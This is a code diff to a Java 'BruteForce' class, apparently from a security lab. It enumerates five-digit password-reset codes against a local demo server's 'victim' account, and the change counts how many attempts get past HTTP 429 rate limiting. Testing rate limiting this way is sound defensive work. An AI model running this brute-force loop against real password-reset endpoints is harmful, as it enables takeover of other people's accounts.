@@ -8,6 +8,7 @@ import lombok.extern.slf4j.Slf4j;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.*;
+import org.springframework.web.client.HttpStatusCodeException;
 import org.springframework.web.client.RestClientException;
 import org.springframework.web.client.RestTemplate;
 
@@ -70,6 +71,7 @@ public class BruteForce {
   public static void main(String[] args) {
     setLoggingLevel(Level.INFO);
     AtomicInteger countDone = new AtomicInteger(0);
+    AtomicInteger attemptsSucceeded = new AtomicInteger(0);
     RestTemplate rest = new RestTemplate();
     rest.getForObject("http://localhost:8080/user/victim/reset-password-step1", String.class);
     boolean r = IntStream.range(100_00, 1_000_00)
@@ -85,11 +87,17 @@ public class BruteForce {
                 System.out.println("Got "+s+". Successfully reset victim's password ");
                 return true;
               } catch (RestClientException e) {
+                if (e instanceof HttpStatusCodeException
+                    && ((HttpStatusCodeException)e).getStatusCode()==HttpStatus.TOO_MANY_REQUESTS){
+                  return  false; // blocked
+                }
+                attemptsSucceeded.incrementAndGet();
                 return false;
               }
             })
             .anyMatch(e -> e);
     System.out.println("EXPERIMENT SUCESS: " + r);
+    System.out.println("Attempts succeeded = " + attemptsSucceeded.get());
   }
 
   public static void setLoggingLevel(Level level) {
